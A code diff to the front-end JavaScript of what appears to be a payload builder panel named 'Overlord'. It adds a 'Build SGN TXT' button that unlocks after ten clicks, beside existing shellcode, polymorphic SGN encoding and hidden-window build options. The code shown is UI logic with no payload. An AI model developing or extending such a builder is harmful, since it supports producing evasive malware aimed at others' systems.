@@ -46,6 +46,7 @@ const platformInputs = document.querySelectorAll('input[name="platform"]');
 
 let currentServerVersion = null;
 let currentUserRole = null;
+let currentUsername = null;
 let showAllBuilds = false;
 
 async function loadServerVersion() {
@@ -1232,7 +1233,9 @@ async function init() {
 
     const data = await res.json();
     currentUserRole = data.role;
+    currentUsername = data.username || null;
     usernameDisplay.textContent = data.username;
+    loadSgnTxtUnlockState();
 
     const roleBadges = {
       admin: '<i class="fa-solid fa-crown mr-1"></i>Admin',
@@ -1440,6 +1443,7 @@ form?.addEventListener("submit", async (e) => {
     shellcodeConsole: document.getElementById("shellcode-console")?.checked || false,
     useSgn: document.getElementById("sgn-mode")?.checked || false,
     sgnIterations: parseInt(document.getElementById("sgn-iterations")?.value, 10) || 1,
+    outputSgnTxt: pendingSgnTxtBuild,
     uploadToFileShare: pendingUpload,
   };
 
@@ -1497,6 +1501,10 @@ async function startBuild(config) {
   if (buildUploadBtn) {
     buildUploadBtn.disabled = true;
     buildUploadBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> <span>Building...</span>';
+  }
+  if (buildSgnTxtBtn) {
+    buildSgnTxtBtn.disabled = true;
+    setSgnTxtButtonState("Building TXT...", "fa-solid fa-spinner fa-spin");
   }
 
   buildStatus.classList.remove("hidden");
@@ -1558,7 +1566,12 @@ async function startBuild(config) {
       buildUploadBtn.disabled = false;
       buildUploadBtn.innerHTML = '<i class="fa-solid fa-cloud-arrow-up"></i> <span>Build & Upload</span>';
     }
+    if (buildSgnTxtBtn) {
+      buildSgnTxtBtn.disabled = false;
+      updateSgnTxtLockState();
+    }
     pendingUpload = false;
+    pendingSgnTxtBuild = false;
   }
 }
 
@@ -1947,6 +1960,78 @@ let pendingUpdateAll = false;
 let pendingUpdateHideWindow = false;
 let pendingUpload = false;
 const buildUploadBtn = document.getElementById("build-upload-btn");
+let pendingSgnTxtBuild = false;
+const buildSgnTxtBtn = document.getElementById("build-sgn-txt-btn");
+const buildSgnTxtLockbox = document.getElementById("build-sgn-txt-lockbox");
+const SGN_TXT_UNLOCK_CLICKS = 10;
+let sgnTxtUnlockClicks = 0;
+let sgnTxtUnlocked = false;
+
+function getSgnTxtUnlockStorageKey() {
+  const userPart = String(currentUsername || "unknown").trim().toLowerCase() || "unknown";
+  return `overlord_sgn_txt_unlocked:${userPart}`;
+}
+
+function loadSgnTxtUnlockState() {
+  try {
+    if (localStorage.getItem(getSgnTxtUnlockStorageKey()) === "true") {
+      sgnTxtUnlockClicks = SGN_TXT_UNLOCK_CLICKS;
+      sgnTxtUnlocked = true;
+    }
+  } catch {}
+  updateSgnTxtLockState();
+}
+
+function saveSgnTxtUnlockState() {
+  try {
+    localStorage.setItem(getSgnTxtUnlockStorageKey(), "true");
+  } catch {}
+}
+
+function setSgnTxtButtonState(label, iconClass) {
+  if (!buildSgnTxtBtn) return;
+  buildSgnTxtBtn.innerHTML = "";
+  const icon = document.createElement("i");
+  icon.className = iconClass;
+  const text = document.createElement("span");
+  text.textContent = label;
+  buildSgnTxtBtn.appendChild(icon);
+  buildSgnTxtBtn.appendChild(text);
+}
+
+function pulseSgnTxtLockbox() {
+  if (!buildSgnTxtLockbox) return;
+  buildSgnTxtLockbox.classList.remove("pulse");
+  void buildSgnTxtLockbox.offsetWidth;
+  buildSgnTxtLockbox.classList.add("pulse");
+}
+
+function updateSgnTxtLockState() {
+  if (!buildSgnTxtBtn || !buildSgnTxtLockbox) return;
+  const progress = Math.min(1, Math.max(0, sgnTxtUnlockClicks / SGN_TXT_UNLOCK_CLICKS));
+  const stageProgress = (start, end) => Math.min(1, Math.max(0, (progress - start) / (end - start)));
+  const crackProgress = Math.min(1, Math.sqrt(progress) * 1.18);
+  const midCrackProgress = Math.sqrt(stageProgress(0.18, 0.72));
+  const lateCrackProgress = Math.sqrt(stageProgress(0.48, 0.95));
+  buildSgnTxtLockbox.style.setProperty("--sgn-chain-brightness", String(Math.max(0.72, 1 - progress * 0.28)));
+  buildSgnTxtLockbox.style.setProperty("--sgn-chain-opacity", String(Math.max(0.48, 0.9 - progress * 0.42)));
+  buildSgnTxtLockbox.style.setProperty("--sgn-crack-opacity", String(Math.max(0, Math.min(1, crackProgress))));
+  buildSgnTxtLockbox.style.setProperty("--sgn-crack-dash", String(Math.max(0, 1 - crackProgress)));
+  buildSgnTxtLockbox.style.setProperty("--sgn-crack-mid-opacity", String(midCrackProgress * 0.9));
+  buildSgnTxtLockbox.style.setProperty("--sgn-crack-mid-dash", String(Math.max(0, 1 - midCrackProgress)));
+  buildSgnTxtLockbox.style.setProperty("--sgn-crack-late-opacity", String(lateCrackProgress * 0.95));
+  buildSgnTxtLockbox.style.setProperty("--sgn-crack-late-dash", String(Math.max(0, 1 - lateCrackProgress)));
+  buildSgnTxtLockbox.style.setProperty("--sgn-lock-tilt", `${Math.round(progress * 10)}deg`);
+  buildSgnTxtLockbox.classList.toggle("locked", !sgnTxtUnlocked);
+  buildSgnTxtLockbox.classList.toggle("unlocked", sgnTxtUnlocked);
+  if (sgnTxtUnlocked) {
+    setSgnTxtButtonState("Build SGN TXT", "fa-solid fa-file-lines");
+    return;
+  }
+  setSgnTxtButtonState("Build SGN TXT", "fa-solid fa-file-lines");
+}
+
+updateSgnTxtLockState();
 
 function showUpdateAllModal() {
   if (!updateAllModal) return;
@@ -2052,6 +2137,37 @@ if (buildUploadBtn) {
       return;
     }
     pendingUpload = true;
+    form.requestSubmit();
+  });
+}
+
+if (buildSgnTxtBtn) {
+  buildSgnTxtBtn.addEventListener("click", () => {
+    if (isBuilding) return;
+    const sgnEnabled = document.getElementById("sgn-mode")?.checked || false;
+    if (!sgnTxtUnlocked) {
+      sgnTxtUnlockClicks += 1;
+      if (sgnTxtUnlockClicks >= SGN_TXT_UNLOCK_CLICKS) {
+        sgnTxtUnlocked = true;
+        saveSgnTxtUnlockState();
+        updateSgnTxtLockState();
+        if (window.showToast) window.showToast("SGN TXT build unlocked", "success");
+      } else {
+        updateSgnTxtLockState();
+      }
+      pulseSgnTxtLockbox();
+      return;
+    }
+    if (!sgnEnabled) {
+      alert("Enable the SGN Polymorphic Encoding option before building an SGN TXT file.");
+      return;
+    }
+    const platformCheckboxes = form.querySelectorAll('input[name="platform"]:checked');
+    if (platformCheckboxes.length === 0) {
+      alert("Please select at least one platform to build");
+      return;
+    }
+    pendingSgnTxtBuild = true;
     form.requestSubmit();
   });
 }
